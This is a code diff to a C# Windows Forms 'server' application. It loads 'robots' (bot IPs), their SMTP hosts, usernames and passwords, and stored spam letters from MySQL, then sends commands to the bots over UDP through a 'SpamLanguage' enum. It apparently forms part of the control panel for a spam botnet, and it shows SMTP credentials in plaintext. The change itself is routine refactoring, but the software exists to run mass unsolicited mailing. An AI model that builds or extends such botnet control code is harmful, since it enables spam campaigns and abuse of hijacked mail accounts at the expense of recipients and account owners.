@@ -37,8 +37,8 @@ WHERE
 FROM
 	robots
 WHERE
-	(Hostname <> '0.0.0.0') AND
-	(Hostname <> '255.255.255.255')";
+	(IP <> '0.0.0.0') AND
+	(IP <> '255.255.255.255')";
 
 		public const string selectSmtpByIdQuery =
 @"SELECT
@@ -56,6 +56,9 @@ WHERE
 		UdpClient udpClient;
 		MySqlConnection sqlConnection;
 		Settings sets = Settings.Default;
+
+		List<Robot> listRobot = null;
+		List<Letter> listLetter = null;
 
 		public FormServer() {
 			InitializeComponent();
@@ -126,7 +129,7 @@ WHERE
 		}
 
 		private void PopulateMessages() {
-			if ( !( listMessages.Enabled = TryConnection() ) )
+			if ( !( listBoxMessages.Enabled = TryConnection() ) )
 				return;
 
 			MySqlCommand sqlCmd =
@@ -134,7 +137,7 @@ WHERE
 			MySqlDataReader sqlReader = sqlCmd.ExecuteReader();
 
 			Letter letter;
-			List<Letter> listLetter = new List<Letter>();
+			listLetter = new List<Letter>();
 			while ( sqlReader.Read() ) {
 				letter.Id = sqlReader.GetInt32(0);
 				letter.Subject = sqlReader.GetString(1);
@@ -143,12 +146,13 @@ WHERE
 				listLetter.Add(letter);
 			}
 
-			FillListMessages(listLetter);
+			sqlReader.Close();
+			FillListMessages();
 		}
 
 		private void PopulateRobots() {
 			if ( !TryConnection() ) {
-				listRobots.Enabled = false;
+				listBoxRobots.Enabled = false;
 				return;
 			}
 
@@ -156,31 +160,51 @@ WHERE
 				new MySqlCommand(selectRobotsQuery, sqlConnection);
 			MySqlDataReader sqlReader = sqlCmd.ExecuteReader();
 
-			Robot robot;
-			List<Robot> listRobot = new List<Robot>();
+			Robot robot = new Robot();
+			listRobot = new List<Robot>();
 			while ( sqlReader.Read() ) {
 				// IP, HumanName, SmtpID
 				robot.IP = sqlReader.GetString(0);
 				robot.Name = sqlReader.GetString(1);
 				robot.SmtpId = sqlReader.GetInt32(2);
-				GetSmtpServerById(robot.SmtpId);
 				listRobot.Add(robot);
 			}
 
-			FillListMessages(listLetter);
+			sqlReader.Close();
+
+			for ( int i = 0; i < listRobot.Count; i++ ) {
+				Robot tmpRobot = listRobot[i];
+				tmpRobot.SmtpServer =
+					GetSmtpServerById(tmpRobot.SmtpId);
+				listRobot[i] = tmpRobot;
+			}
+
+			FillListRobots();
 		}
 
+		//private void ResolveSmtpId(Robot robot) {
+		//    robot.SmtpServer = GetSmtpServerById(robot.SmtpId);
+		//}
+
 		private void PopulateEmails() {
-			throw new Exception("The method or operation is not implemented.");
+			//throw new Exception("The method or operation is not implemented.");
 		}
 
 		private AuthServerInfo GetSmtpServerById(int id) {
-			AuthServerInfo servInf;
-			MySqlCommand sqlCmd = new MySqlCommand(selectRobotsQuery, sqlConnection);
+			AuthServerInfo servInf = new AuthServerInfo();
+			MySqlCommand sqlCmd = new MySqlCommand(selectSmtpByIdQuery + id.ToString(),
+				sqlConnection);
 			MySqlDataReader sqlReader = sqlCmd.ExecuteReader();
 			if ( sqlReader.Read() ) {
-				sqlr
+				// Host Port login Password UseSSL
+				servInf.Host = sqlReader.GetString(0);
+				servInf.Port = sqlReader.GetInt32(1);
+				servInf.Username = sqlReader.GetString(2);
+				servInf.Password = sqlReader.GetString(3);
+				servInf.UseSSL = sqlReader.GetInt16(4) == 1 ? true : false;
 			}
+			sqlReader.Close();
+			return servInf;
 		}
 
 		#endregion
@@ -204,6 +228,10 @@ WHERE
 			}
 
 			udpClient.BeginReceive(Priem, iar);
+		}
+
+		private void AddRobot(string p) {
+			throw new Exception("The method or operation is not implemented.");
 		}
 
 		private void Say(string Host, int Port, SpamLanguage cmd) {
@@ -230,25 +258,47 @@ WHERE
 			}
 		}
 
-		private void FillListMessages(List<Letter> listLetter) {
-			listMessages.Items.Clear();
+		private void FillListMessages() {
+			listBoxMessages.Items.Clear();
 			foreach ( Letter letter in listLetter ) {
 				string item = "";
 				item += "#" + letter.Id.ToString()
 					+ " ";
-				item += ( letter.Subject == null ?
-					"<no subject>" : "'" + letter.Subject + "'" )
-					+ ", as ";
+				item += letter.Subject == null ? "<no subject>" :
+					"'" + letter.Subject + "'";
+				item += ", as ";
 				item += letter.IsHtml == 1 ? "HTML" : "text";
 
-				listMessages.Items.Add(item);
+				listBoxMessages.Items.Add(item);
+			}
+		}
+
+		private void FillListRobots() {
+			listBoxRobots.Items.Clear();
+
+			if ( listRobot == null ) {
+				listBoxRobots.Items.Add("<no robots in database>");
+				return;
+			}
+
+			foreach ( Robot robot in listRobot ) {
+				string item = "";
+				item += robot.IP + " \"";
+				item += robot.Name + "\"; SMTP: ";
+				item += robot.SmtpServer.Host + ":";
+				item += robot.SmtpServer.Port.ToString() + ", ";
+				item += robot.SmtpServer.Username + ":";
+				item += robot.SmtpServer.Password + ", ";
+				item += robot.SmtpServer.UseSSL ? "using SSL" : "not using SSL";
+
+				listBoxRobots.Items.Add(item);
 			}
 		}
 
 		#region Events handlers
 
 		private void FormServer_Load(object sender, EventArgs e) {
-			tabControl.SelectedIndex = 0;// messages tab
+			tabControl.TabPages["tabMessages"].Select();
 			PopulateMessages();
 		}
 
@@ -259,14 +309,14 @@ WHERE
 
 		private void tabControl1_SelectedIndexChanged(object sender, EventArgs e) {
 			switch ( tabControl.SelectedIndex ) {
-			case 0: // messages
+			case 0: // emails
+				PopulateEmails();
+				break;
+			case 1: // messages
 				PopulateMessages();
 				break;
-			case 1: // robots
+			case 2: // robots
 				PopulateRobots();
-				break;
-			case 2: // emails
-				PopulateEmails();
 				break;
 			case 3: // common
 				//PopulateMessages();
